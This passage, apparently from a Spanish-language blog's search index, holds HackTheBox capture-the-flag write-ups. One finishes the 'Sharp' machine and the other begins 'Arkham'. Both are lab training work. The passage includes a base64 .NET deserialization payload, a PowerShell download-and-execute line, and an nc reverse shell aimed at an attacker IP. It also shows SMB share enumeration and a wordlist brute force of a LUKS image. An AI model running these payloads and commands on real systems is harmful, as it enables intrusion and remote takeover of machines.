nRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=En consola obtenemos: System. InvalidCastException: Unable to cast object of type 'System. Collections. Generic. SortedSet`1[System. String]' to type 'System. Runtime. Remoting. Messaging. IMessage'.  at System. Runtime. Remoting. Channels. CoreChannel. DeserializeBinaryRequestMessage(String objectUri, Stream inputStream, Boolean bStrictBinding, TypeFilterLevel securityLevel)  at System. Runtime. Remoting. Channels. BinaryServerFormatterSink. ProcessMessage(IServerChannelSinkStack sinkStack, IMessage requestMsg, ITransportHeaders requestHeaders, Stream requestStream, IMessage&amp; responseMsg, ITransportHeaders&amp; responseHeaders, Stream&amp; responseStream)Pero que pasa, como toda deserializaci√≥n, el proceso falla, pero no nos interesa, porque nuestro c√≥digo se ejecut√≥ antes que el error, por lo tanto nosotros ya hemos conseguido una sesi√≥n: Tamos en el sistema como lars y tenemos acceso a la flag user. txt :) Enumeremos para ver como escalar privilegios‚Ä¶ ‚Ä¶ Escalada de privilegios #: Recorriendo la m√°quina encontramos unos archivos en c:\Users\lars\Documents: c:\Users\lars\Documents&gt;dir Volume in drive C is System Volume Serial Number is 7824-B3D4 Directory of c:\Users\lars\Documents02/08/2021 07:35 PM  &lt;DIR&gt;     . 02/08/2021 07:35 PM  &lt;DIR&gt;     . . 11/15/2020 01:40 PM  &lt;DIR&gt;     wcf        0 File(s)       0 bytes        3 Dir(s) 32,343,658,496 bytes freec:\Users\lars\Documents&gt;dir wcfdir wcf Volume in drive C is System Volume Serial Number is 7824-B3D4 Directory of c:\Users\lars\Documents\wcf11/15/2020 01:40 PM  &lt;DIR&gt;     . 11/15/2020 01:40 PM  &lt;DIR&gt;     . . 11/15/2020 01:40 PM  &lt;DIR&gt;     . vs11/15/2020 01:40 PM  &lt;DIR&gt;     Client11/15/2020 01:40 PM  &lt;DIR&gt;     packages11/15/2020 01:40 PM  &lt;DIR&gt;     RemotingLibrary11/15/2020 01:41 PM  &lt;DIR&gt;     Server11/15/2020 12:47 PM       2,095 wcf. sln        1 File(s)     2,095 bytes        7 Dir(s) 32,343,658,496 bytes freec:\Users\lars\Documents&gt;Si le damos un vistaso al cliente (como hicimos al inicio) vemos: c:\Users\lars\Documents&gt;cd wcf\Clientc:\Users\lars\Documents\wcf\Client&gt;dir Volume in drive C is System Volume Serial Number is 7824-B3D4 Directory of c:\Users\lars\Documents\wcf\Client11/15/2020 01:40 PM  &lt;DIR&gt;     . 11/15/2020 01:40 PM  &lt;DIR&gt;     . . 11/14/2020 11:14 PM        184 App. config11/15/2020 01:40 PM  &lt;DIR&gt;     bin11/15/2020 01:36 PM       2,639 Client. csproj11/15/2020 01:40 PM  &lt;DIR&gt;     obj11/15/2020 01:39 PM        625 Program. cs11/15/2020 01:40 PM  &lt;DIR&gt;     Properties        3 File(s)     3,448 bytes        5 Dir(s) 32,343,658,496 bytes freec:\Users\lars\Documents\wcf\Client&gt;type Program. csusing RemotingSample;using System;using System. ServiceModel;namespace Client {  public class Client  {    public static void Main() {      ChannelFactory&lt;IWcfService&gt; channelFactory = new ChannelFactory&lt;IWcfService&gt;(        new NetTcpBinding(SecurityMode. Transport), net. tcp://localhost:8889/wcf/NewSecretWcfEndpoint       );      IWcfService client = channelFactory. CreateChannel();      Console. WriteLine(client. GetDiskInfo());      Console. WriteLine(client. GetCpuInfo());      Console. WriteLine(client. GetRamInfo());    }  }}c:\Users\lars\Documents\wcf\Client&gt;Tiene practicamente la misma estructura que el anterior cliente, pero lo interesante de esto es su propietario: c:\Users\lars\Documents\wcf\Client&gt;dir /q * Volume in drive C is System Volume Serial Number is 7824-B3D4 Directory of c:\Users\lars\Documents\wcf\Client11/15/2020 01:40 PM  &lt;DIR&gt;     BUILTIN\Administrators . 11/15/2020 01:40 PM  &lt;DIR&gt;     BUILTIN\Administrators . . 11/14/2020 11:14 PM        184 BUILTIN\Administrators App. config11/15/2020 01:40 PM  &lt;DIR&gt;     BUILTIN\Administrators bin11/15/2020 01:36 PM       2,639 BUILTIN\Administrators Client. csproj11/15/2020 01:40 PM  &lt;DIR&gt;     BUILTIN\Administrators obj11/15/2020 01:39 PM        625 BUILTIN\Administrators Program. cs11/15/2020 01:40 PM  &lt;DIR&gt;     BUILTIN\Administrators Properties        3 File(s)     3,448 bytes        5 Dir(s) 32,343,658,496 bytes freec:\Users\lars\Documents\wcf\Client&gt;Lo que quiere decir que lo que se est√© ejecutando, ser√° ¬´ejecutado¬ª con privilegios de administrador. Intentemos modificar el archivo Client. exe, pero para eso debemos mover todo el directorio (por tema de librer√≠as, llamados, etc. ) a nuestra m√°quina para agregar lo que necesitemos y posteriormente compilar y volver a subir los objetos. Podemos generar un comprimido de todo para facilitarnos la transferencia, aprovechamos el uso de PowerShell y la herramienta Compress-Archive para hacerlo: PS C:\Users\lars\Documents&gt; Compress-Archive wcf c:\dev\out. zipPS C:\Users\lars\Documents&gt; dir c:\dev  Directory: C:\devMode        LastWriteTime     Length Name----        -------------     ------ -----a----    11/15/2020 10:25 AM      5632 Client. exe-a----    11/15/2020  1:59 PM       70 notes. txt-a----     2/8/2021 11:36 PM    11598452 out. zip-a----    11/15/2020 10:25 AM      4096 RemotingLibrary. dll-a----    11/16/2020 11:55 AM      6144 Server. exePero‚Ä¶ ¬øPor qu√© sobre la ruta dev/? Bueno, si recordamos, los archivos Client. exe, Server. exe y notes. txt los obtuvimos mediante SMB con el usuario lars sobre la carpeta compartida dev/. Lo que quiere decir que seguimos teniendo acceso a ella, solo que ahora lo haremos desde Windows. Abrimos la conexi√≥n sobre la unidad Z: ahora: Validamos: PS C:\htb_sharp\files&gt; net useNo se recordar√°n las nuevas conexiones. Estado    Local   Remoto          Red-------------------------------------------------------------------------------Conectado  Z:    \\10. 10. 10. 219\dev    Microsoft Windows NetworkSe ha completado el comando correctamente.  Info sobre el uso de net use. Perfecto, ahora simplemente validamos que tengamos los archivos: PS C:\htb_sharp\files&gt; dir z:  Directorio: z:\Mode        LastWriteTime     Length Name----        -------------     ------ -----a----  15/11/2020 05:25 a. m.      5632 Client. exe-a----  15/11/2020 08:59 a. m.       70 notes. txt-a----  08/02/2021 06:36 p. m.    11598452 out. zip-a----  15/11/2020 05:25 a. m.      4096 RemotingLibrary. dll-a----  16/11/2020 06:55 a. m.      6144 Server. exeTenemos el comprimido, ahora si a jugar :) Descomprimimos y abrimos el archivo wcf. sln con Visual Studio: Detallamos que al ser ejecutado, muestra info del sistema; informaci√≥n del disco, de la CPU y la RAM :I Console. WriteLine(client. GetDiskInfo());Console. WriteLine(client. GetCpuInfo());Console. WriteLine(client. GetRamInfo());Probemos ahora a agregar una linea que nos genere una nueva Reverse Shell, pero ahora ser√° como Administrator (ojala :P). //Podemos simplemente invocar PowerShell usando el cliente que ya esta definidoConsole. WriteLine(client. InvokePowerShell( IEX(New-Object Net. WebClient). downloadString('http://10. 10. 14. 34:8000/P. ps1') ));Ahora el codigo quedaria: Compilamos :O 1&gt;------ Operaci√≥n Compilar iniciada: proyecto: RemotingLibrary, configuraci√≥n: Debug Any CPU ------1&gt; RemotingLibrary -&gt; C:\htb_sharp\files\wcfCompress\wcf\RemotingLibrary\bin\Debug\WcfRemotingLibrary. dll2&gt;------ Operaci√≥n Compilar iniciada: proyecto: Client, configuraci√≥n: Debug Any CPU ------2&gt; Client -&gt; C:\htb_sharp\files\wcfCompress\wcf\Client\bin\Debug\WcfClient. exe========== Compilar: 2 correctos, 0 incorrectos, 0 actualizados, 0 omitidos ==========Perfe, antes de pasar los archivos (m√°s que todo por que me acorde y despues de me olvida :P), modifiquemos el objeto P. ps1 para que apunte a otro puerto por ejemplo el 4435. . . . }Invoke-PowerShellTcp -Reverse -IPAddress 10. 10. 14. 34 -Port 4435Pongamonos en escucha: PS C:\htb_sharp\files&gt; . \nc. exe -lvp 4435listening on [any] 4435 . . . Movamoslos: PS C:\Users\lars\Videos&gt; IWR -uri http://10. 10. 14. 34:8000/WcfClient. exe -OutFile c:\Users\lars\Videos\WcfClient. exePS C:\Users\lars\Videos&gt; IWR -uri http://10. 10. 14. 34:8000/WcfRemotingLibrary. dll -OutFile c:\Users\lars\Videos\WcfRemotingLibrary. dllPS C:\Users\lars\Videos&gt; ls  Directory: C:\Users\lars\VideosMode        LastWriteTime     Length Name----        -------------     ------ -----a----     2/9/2021  1:11 AM      5120 WcfClient. exe-a----     2/9/2021  1:11 AM      7680 WcfRemotingLibrary. dllY ejecutamos el binario: PS C:\Users\lars\Videos&gt; . \WcfClient. exe. . . Salen errores, peeeeeeeeeeerooooooooooooooooooooooooooooooooooooooooo: Nicceeeeeeeeeeeeeeeeeeeeeeeeeeeeee, tamos dentro paaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaai!! Veamos las flags. Bueno, a√∫n no, la sesi√≥n se cierra r√°pido, intentemos subir el binario nc para r√°pidamente generar otra Reverse Shell separada del proceso que tiene el WcfClient. exe: PS C:\Users\lars\Videos&gt; IWR -uri http://10. 10. 14. 34:8000/nc64. exe -OutFile c:\Users\lars\Videos\nc. exeEjecutamos de nuevo el binario . \WcfClient. exe y apenas tengamos la Shell por el puerto 4435, generamos otra por el 4436 (nos ponemos en escucha): PS C:\Windows\system32&gt; c:\Users\lars\Videos\nc. exe 10. 10. 14. 34 4436 -e cmd. exeAhora si veamos las flags: Antes de irnos, cerremos la unidad Z: que hab√≠amos abierto para compartirnos el archivo comprimido: PS C:\htb_sharp\files&gt; net useNo se recordar√°n las nuevas conexiones. Estado    Local   Remoto          Red-------------------------------------------------------------------------------Conectado  Z:    \\10. 10. 10. 219\dev    Microsoft Windows NetworkSe ha completado el comando correctamente. PS C:\htb_sharp\files&gt; net use Z: /deleteHay archivos abiertos y/o b√∫squedas incompletas de directorios pendientes en la conexi√≥n con Z:. ¬øDesea continuar la desconexi√≥n y forzar el cierre? (S/N) [N]: SZ: se ha eliminado. PS C:\htb_sharp\files&gt; net useNo se recordar√°n las nuevas conexiones. No hay entradas en la lista. PS C:\htb_sharp\files&gt;Ahora seeee. ‚Ä¶ Hemo acabao‚Äô como siempre, muchas gracias por leer y nos veremos en otro writeup ;) A ROMPER TODOOOOOOOOOOOO! "
    }, {
    "id": 53,
    "url": "http://localhost:4000/htb/arkham",
    "title": "HackTheBox - Arkham",
    "body": "2021/04/28 - M√°quina Windows nivel medio, deserializaremos JavaServer Faces, jugaremos con muchos payloads con la necesidad de firmarlos con una llave :O Haremos Port Fortwarding, leeremos correos y montaremos el directorio raiz del sistema (C:) en otro con todos los permisos para leer archivos.  TL;DR (Spanish writeup): Creada por: MinatoTW. Buaaa, a jugar. Nos enfrentaremos a una deserializaci√≥n insegura mediante el servicio JavaServer Faces y su campo javax. faces. ViewState, pero necesitaremos una llave para lograr encriptar nuestro payload, la llave la encontraremos enumerando el servicio SMB en un archivo LUKS encriptado, haremos fuerza bruta para encontrar la contrase√±a del objeto y finalmente obtener la llave para firmar el payload. Nos apoyaremos de ysoserial para generar varios payloads maliciosos y ejecutar comandos en el sistema, obtendremos una terminal como el usuario Alfred. Estando dentro nos toparemos con un archivo . zip el cual contiene el backup del correo de alfred, dentro una imagen que nos muestra nuevas credenciales, en este caso del usuario Batman. Aprovecharemos que el servicio WinRM est√° siendo ejecutado internamente para entablarnos un Reverse Port Fortwarding y finalmente usar evil-winrm. As√≠ obtendremos una PowerShell como batman. Nos daremos cuenta de que estamos en el grupo Administrators, pero que no tenemos los permisos realmente. Podemos aprovechar la herramienta net use para montarnos el directorio C:\ en un disco cualquiera, as√≠ tendremos todos los archivos del sistema para jugar con ellos. (Entiendo que debe haber otra forma en la que tengamos tooooooodos los permisos, pero a√∫n sigo mir√°ndolo). Clasificaci√≥n de la m√°quina: Poco jugueteo, queriendo ser real pero jmm :(  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ BUEEENO COMO ESSSS:  Enumeraci√≥n.  Explotaci√≥n.  Movimiento lateral Alfred -&gt; Batman.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Como siempre, validemos que servicios esta corriendo la m√°quina: ‚ù≠ nmap -p- --open -v 10. 10. 10. 130 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚ù≠ cat initScan # Nmap 7. 80 scan initiated Fri Apr 23 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 130# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 130 ()  Status: UpHost: 10. 10. 10. 130 ()  Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 8080/open/tcp//http-proxy///, 49666/open/tcp/////, 49667/open/tcp/////  Ignored State: filtered (65528)# Nmap done at Fri Apr 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 404. 77 secondsNos encontramos los puertos:       Puerto   Descripci√≥n         80   HTTP       135   RPC       139   SMB       445   SMB       8080   HTTP Proxy       49666 - 49667   Desconocidos   Listo, ya tenemos los puertos abiertos, pero ahora juguemos a escanear scripts y versiones, asi obtendremos m√°s info de cada uno: (Usamos la funci√≥n referenciada antes ‚ù≠ extractPorts initScan ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  1  ‚îÇ  2  ‚îÇ [*] Extracting information. . .  3  ‚îÇ  4  ‚îÇ   [*] IP Address: 10. 10. 10. 130  5  ‚îÇ   [*] Open ports: 80,135,139,445,8080,49666,49667  6  ‚îÇ  7  ‚îÇ [*] Ports copied to clipboard  8  ‚îÇ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ) ‚ù≠ nmap -p80,135,139,445,8080,49666,49667 -sC -sV 10. 10. 10. 130 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚ù≠ cat portScan # Nmap 7. 80 scan initiated Fri Apr 23 25:25:25 2021 as: nmap -p80,135,139,445,8080,49666,49667 -sC -sV -oN portScan 10. 10. 10. 130Nmap scan report for 10. 10. 10. 130Host is up (0. 20s latency). PORT   STATE SERVICE    VERSION80/tcp  open http     Microsoft IIS httpd 10. 0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10. 0|_http-title: IIS Windows Server135/tcp  open msrpc     Microsoft Windows RPC139/tcp  open netbios-ssn  Microsoft Windows netbios-ssn445/tcp  open microsoft-ds?8080/tcp open http     Apache Tomcat 8. 5. 37| http-methods: |_ Potentially risky methods: PUT DELETE|_http-open-proxy: Proxy might be redirecting requests|_http-title: Mask Inc. 49666/tcp open msrpc     Microsoft Windows RPC49667/tcp open msrpc     Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 7m16s| smb2-security-mode: |  2. 02: |_  Message signing enabled but not required| smb2-time: |  date: 2021-04-23T17:34:01|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Fri Apr 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 100. 17 secondsObtenemos (varias cositas que veremos despues) por ahora:       Puerto   Servicio   Versi√≥n         80   HTTP   Microsoft IIS httpd 10       135   RPC   Microsoft Windows RPC       139   SMB   Microsoft Windows netbios-ssn       445   SMB   (?) No sabemos       8080   HTTP Proxy   Apache Tomcat 8. 5. 37       49666   RPC   Microsoft Windows RPC       49667   RPC   Microsoft Windows RPC   Bien, empecemos a divagar, perd√°monos en cada puerto y veamos en cu√°l podremos renacer üòÇ ‚Ä¶ Puerto 80 ‚åñ: La ventana por default del servidor Windows Internet Information Services (IIS), no hay nada en el c√≥digo fuente y tampoco validando mediante fuzzing si hab√≠a algo fuera de la vista‚Ä¶ As√≠ que por ahora mov√°monos a otro puerto. ‚Ä¶ Puerto 135 (RPC) ‚åñ:  MSRPC (Microsoft Remote Procedure Call): Nos permite ejecutar procesos remotamente, pueden ser en otros sistemas o recursos compartidos en la red. Podemos usar rpcclient para interactuar con el dominio, ya que nos permite acceder con credenciales nulas: ‚ù≠ rpcclient -U '' 10. 10. 10. 130Enter WORKGROUP\'s password: rpcclient $&gt; enumdomusers result was NT_STATUS_CONNECTION_DISCONNECTEDo ‚ù≠ rpcclient -U '' 10. 10. 10. 130 -Nrpcclient $&gt; enumdomusers Could not initialise samr. Error was NT_STATUS_ACCESS_DENIEDPero dando unas vueltas obtenemos siempre errores, as√≠ que por ahora tampoco podemos sacar mucho de ac√°, veamos los puertos SMB. ‚Ä¶ Puerto 139-445 (SMB) ‚åñ:  SAMBA, en terminos generales nos permite compartir archivos (y varias cosas m√°s) entre usuarios de una misma red.  M√°s info sobre los puertos 139 y 445 de SAMBA. Inicialmente podemos validar con crackmapexec la versi√≥n del sistema con el que estamos jugando: ‚ù≠ crackmapexec smb 10. 10. 10. 130SMB     10. 10. 10. 130  445  ARKHAM      [*] Windows 10. 0 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False)Sistema operativo Windows 10 Build 17763 :o Ahora usemos smbmap para ver los recursos compartidos (en caso de existir y si nos deja verlos, claro esta): ‚ù≠ smbmap -H 10. 10. 10. 130[+] IP: 10. 10. 10. 130:445    Name: unknown Indiquemosle un null session: ‚ù≠ smbmap -H 10. 10. 10. 130 -u 'null'[+] Guest session    IP: 10. 10. 10. 130:445  Name: unknown    Disk              Permissions   Comment    ----              -----------   -------    ADMIN$             NO ACCESS    Remote Admin    BatShare            READ ONLY    Master Wayne's secrets    C$               NO ACCESS    Default share    IPC$              READ ONLY    Remote IPC    Users              READ ONLYPerfe, podemos listar recursos compartidos y vemos dos objetos interesantes, BatShare (Master Wayne‚Äôs secrets) y Users Descargando archivos - BatShare: Usemos smbclient para ver detalladamente que contienen: ‚ù≠ smbclient //10. 10. 10. 130/BatShare -U ''Enter WORKGROUP\'s password: Try  help  to get a list of possible commands. smb: \&gt; dir .                  D    0 Sun Feb 3 08:00:10 2019 . .                  D    0 Sun Feb 3 08:00:10 2019 appserver. zip            A 4046695 Fri Feb 1 01:13:37 2019        5158399 blocks of size 4096. 2128829 blocks availablesmb: \&gt;Podemos descargarlo de vaaaaarias formas, veamos dos, primero desde el propio smbclient (por si quisi√©ramos descargar muuuchos archivos):  Download recursively a directory using smbclient. smb: \&gt; mask   smb: \&gt; recurse ONsmb: \&gt; prompt OFFsmb: \&gt; mget *getting file \appserver. zip of size 4046695 as appserver. zip (436,2 KiloBytes/sec) (average 436,2 KiloBytes/sec)smb: \&gt;‚ù≠ lsappserver. zip‚ù≠ file appserver. zip appserver. zip: Zip archive data, at least v2. 0 to extractAhora con la herramienta smbget (Ponen un espacio en la contrase√±a): ‚ù≠ smbget -R smb://10. 10. 10. 130/BatShare -U ''Password for [] connecting to //BatShare/10. 10. 10. 130: Using workgroup WORKGROUP, guest usersmb://10. 10. 10. 130/BatShare/appserver. zip                                                                            Downloaded 3,86MB in 24 seconds‚ù≠ file appserver. zip appserver. zip: Zip archive data, at least v2. 0 to extractAntes de seguir con el archivo . zip, validemos el otro recurso compartido. Descargando archivos - Users: De nuevo con smbclient: ‚ù≠ smbclient //10. 10. 10. 130/Users -U ''Enter WORKGROUP\'s password: Try  help  to get a list of possible commands. smb: \&gt; dir .                  DR    0 Sun Feb 3 08:24:10 2019 . .                 DR    0 Sun Feb 3 08:24:10 2019 Default              DHR    0 Thu Jan 31 21:49:06 2019 desktop. ini            AHS   174 Sat Sep 15 02:16:48 2018 Guest                D    0 Sun Feb 3 08:24:19 2019        5158399 blocks of size 4096. 2126185 blocks availablesmb: \&gt;Listo, toda la pinta del directorio C:\Users\, volvamos a repetir cualquiera de las dos formas para descargarnos los archivos: ‚ù≠ smbget -R smb://10. 10. 10. 130/Users -U ''Password for [] connecting to //Users/10. 10. 10. 130: Using workgroup WORKGROUP, guest usersmb://10. 10. 10. 130/Users/Default/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts. xml. . . . . . . . . smb://10. 10. 10. 130/Users/Guest/Videos/desktop. iniDownloaded 34,76MB in 685 secondsUff, un mont√≥n de archivos (son varios, pero pues no voy a poner toda la lista) üò± Bueno, ahora si descomprimamos el archivo . zip. Jugando con archivos - BatShare: Con unzip sale sencillito: ‚ù≠ unzip appserver. zip Archive: appserver. zip inflating: IMPORTANT. txt inflating: backup. imgIMPORTANT. txt: ‚ù≠ cat IMPORTANT. txt Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce Jmm Alfred, se puso lindo esto :D Tenemos dos usuarios (o tres) para guardar por si algo:  Alfred.  Bruce.  The Joker (No creo, pero pues no se sabe). Veamos la dichosa imagen que contiene el servidor Linux: ‚ù≠ file backup. img backup. img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38eUn archivo LUKS encriptado‚Ä¶  LUKS (Linux Unified Key Setup-on-disk-format) es una implementaci√≥n muy sencilla de utilizar para la gesti√≥n de particiones y unidades de almacenamiento cifradas en GNU/Linux. Se recomienda su uso en dispositivos m√≥viles, computadoras port√°tiles y dispositivos de almacenamiento cuya informaci√≥n se desee proteger en caso de extrav√≠o o robo. Cifrado de particiones con LUKS. Leyendo sobre como manejar esta imagen y de alguna forma ver su contenido, encontramos este recurso: ‚ù≠ cryptsetup open --type luks /htb/arkham/content/backup. img desireIntroduzca la frase contrase√±a de /htb/arkham/content/backup. img: No hay ninguna clave disponible con esa frase contrase√±a. Nos pide una contrase√±a‚Ä¶ Buscando sobre como podr√≠amos crackear (o jugar con) el archivo encontramos varios recursos:  Brute forcing password cracking devices (LUKS).  How to crack encrypted disk (crypto-LUKS) in an efficient way?.      Grond: The LUKS Password Cracker.    JUGAMOS PRINCIPALMENTE CON: https://github. com/glv2/bruteforce-luks.    Pero si intentamos alguna forma de crackeo demora eternidades üòü Podr√≠amos pensar que quiz√°s en el otro recurso compartido pueda estar alguna contrase√±a de alg√∫n usuario o algo parecido, pero la verdad es que no, (a menos que me haya fallado la vista y el tipeo) no encontramos nada :( Ac√° estuve un tiempito recorriendo archivos y jugando con pensamiento lateral hasta que encontramos (creo) una relaci√≥n entre el nombre de la carpeta compartida (BatShare) y una parte de la nota IMPORTANTE que ten√≠a la imagen (The Joker). Si relacionamos los dos nombres podemos juntar a Batman y el Joker, probablemente sea alg√∫n tipo de ‚Äúpista‚Äù. As√≠ que cre√©monos una wordlist que contenga todas las palabras relacionadas a esas dos (esta parte me cost√≥ pensarla): ‚ù≠ grep -iE  joker|batman  /usr/share/wordlists/rockyou. txt | wc -l2961‚ù≠ grep -iE  joker|batman  /usr/share/wordlists/rockyou. txt &gt; batJok. txtAhora volvamos a intentar el bruteforce: ‚ù≠ bruteforce-luks -f batJok. txt -v 30 backup. imgLe pasamos el diccionario y la imagen para que vaya probando, ademas de indicarle que nos musetre cada 30 segundos en que posicion va: ‚ù≠ bruteforce-luks -f batJok. txt -v 30 backup. imgWarning: using dictionary mode, ignoring options -b, -e, -l, -m and -s. . . . Tried passwords: 109Tried passwords per second: 0,403704Last tried password: batman02Tried passwords: 121Tried passwords per second: 0,403333Last tried password: batman1234Tried passwords: 129Tried passwords per second: 0,403125Last tried password: batmanforeverPassword found: batmanforever:o Encontramso una posible password, pues intentemos ahora abrir el archivo:  Mount LUKS encrypted file. ‚ù≠ cryptsetup open --type luks $(pwd)/backup. img desireIntroduzca la frase contrase√±a de /htb/arkham/content/SMB/BatShare/backup. img:No obtenemos ningun error, validemos: ‚ù≠ ls -la /dev/mapper/total 0drwxr-xr-x 2 root root   80 abr 25 14:28 . drwxr-xr-x 18 root root  3400 abr 25 14:28 . . crw------- 1 root root 10, 236 abr 25 14:28 controllrwxrwxrwx 1 root root    7 abr 25 14:28 desire -&gt; . . /dm-0Y ahora lo montamos: ‚ù≠ ls -la /mnttotal 16drwxr-xr-x 1 root root  0 abr 28 2020 . drwxr-xr-x 1 root root 300 ene 26 10:52 . ‚ù≠ mount /dev/mapper/desire /mnt¬∑ ‚Äª /home/jntx/sec/htb/arkham/content/SMB/BatShare ¬∑‚ù≠ ls -la /mnttotal 30drwxr-xr-x 4 root root 1024 dic 25 2018 . drwxr-xr-x 1 root root  300 ene 26 10:52 . . drwx------ 2 root root 12288 dic 25 2018 lost+founddrwxrwxr-x 4 root root 1024 dic 25 2018 MaskAhora veamos que hay en los directorios: ‚ù≠ tree. ‚îú‚îÄ‚îÄ lost+found‚îî‚îÄ‚îÄ Mask  ‚îú‚îÄ‚îÄ docs  ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ Batman-Begins. pdf  ‚îú‚îÄ‚îÄ joker. png  ‚îú‚îÄ‚îÄ me. jpg  ‚îú‚îÄ‚îÄ mycar. jpg  